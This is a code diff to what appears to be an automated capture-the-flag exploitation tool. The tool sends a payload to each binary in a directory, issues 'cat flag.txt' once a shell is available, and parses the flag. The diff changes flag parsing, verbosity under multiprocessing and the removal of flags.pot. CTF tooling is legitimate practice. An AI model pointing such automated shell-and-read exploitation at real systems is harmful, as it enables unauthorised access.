@@ -65,18 +65,18 @@ def exploit(analyize, v_lvl):
     p.close()
 
 def send(payload, p, analyze):
-
     if payload:
         p.sendline(payload)
         if analyze.has_binsh():
             sleep(0.1)
             p.sendline(b"cat flag.txt")
-        p.recvuntil(b"flag")
-        fart_print.flag(f"{analyze.binary}: flag{p.recvuntil(b'}').decode('utf-8')}")
+        p.recvuntil(b"flag{")
+        char = "{"
+        fart_print.flag(f"{analyze.binary}: flag{char}{p.recvuntil(b'}').decode('utf-8')}")
 
 def __libc_fart_main(binary, v_lvl):
     global analyze
-    try: 
+    try:
         analyze = Analyze(binary)
         exploit(analyze, v_lvl)
     except Exception as e:
@@ -96,18 +96,23 @@ def get_opts():
     
     return pargs
 
+def check_pot_file():
+    pass
+
 if __name__ == "__main__":
     opts = get_opts()
      
     v_lvl = opts.verbosity
     if not v_lvl:
         opts.verbosity = 0
-    fart_print = Print(v_lvl)
-    
+
     
     if opts.directory:
+
+        fart_print = Print(v_level=0)
         bins_dir = opts.directory
     else:
+        fart_print = Print(v_level=v_lvl)
         bins_dir = args.DIR
     
     bins = []
@@ -116,14 +121,12 @@ if __name__ == "__main__":
     fart_print.green(banner)
     
     if bins_dir:
-        # Quiet print on processes
-        v_lvl = 0
-
+        # Disable printing when running multiprocessed
         for binary in os.listdir(bins_dir):    
             bins.append(bins_dir + "/" + binary)
     
         for binary in bins:
-            proc = Process(target=__libc_fart_main, args=(binary,v_lvl))
+            proc = Process(target=__libc_fart_main, args=(binary,0))
             
             proc.start()
             processes.append(proc)
@@ -155,8 +158,8 @@ if __name__ == "__main__":
     print("")
     print("")
     print(tabulate(table, headers=["Binary", "Flag"], showindex="always"))
-    os.remove("flags.pot")
     
+    fart_print.v_level = 4
     if bins:
         fart_print.info(f"Flags recovered: {len(flags)}/{len(bins)}")
     else:
